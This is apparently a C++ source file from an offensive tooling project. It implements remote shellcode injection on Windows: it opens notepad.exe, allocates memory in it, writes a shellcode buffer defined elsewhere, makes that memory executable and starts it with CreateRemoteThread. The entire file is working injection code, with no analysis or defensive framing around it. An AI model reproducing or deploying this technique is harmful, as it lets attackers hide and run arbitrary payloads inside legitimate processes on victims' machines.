#include "utils.h"
#include "process_injection_remote.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>


void processInjectionRemote() {
    const wchar_t* targetProcess = L"notepad.exe"; // Target process name
    DWORD pid = GetProcessIdByName(targetProcess);
    DWORD oldprotect = 0;

    if (pid == 0) {
        std::wcerr << L"Target process not found." << std::endl;
        return;
    }

    std::wcout << L"Target process ID: " << pid << std::endl;

    // Open the target process with necessary permissions
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (!hProcess) {
        std::wcerr << L"Failed to open process. Error: " << GetLastError() << std::endl;
        return;
    }

    // Allocate memory in the target process for the shellcode
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, sizeof(sc),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::wcerr << L"Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(hProcess, remoteMemory, sc, sizeof(sc), NULL)) {
        std::wcerr << L"Failed to write shellcode to target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    std::wcout << L"Shellcode successfully written to target process." << std::endl;

    // Change the allocated memory section permission to Executable
    if (!VirtualProtectEx(hProcess, remoteMemory, sizeof(sc), PAGE_EXECUTE_READ, &oldprotect)) {
        std::wcerr << L"Failed to change memory protection in target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Create a remote thread in the target process to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory,
        NULL, 0, NULL);
    if (!hThread) {
        std::wcerr << L"Failed to create remote thread. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    std::wcout << L"Remote thread successfully created." << std::endl;

    // Wait for the thread to finish execution
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::wcout << L"Shellcode executed and resources cleaned up." << std::endl;
}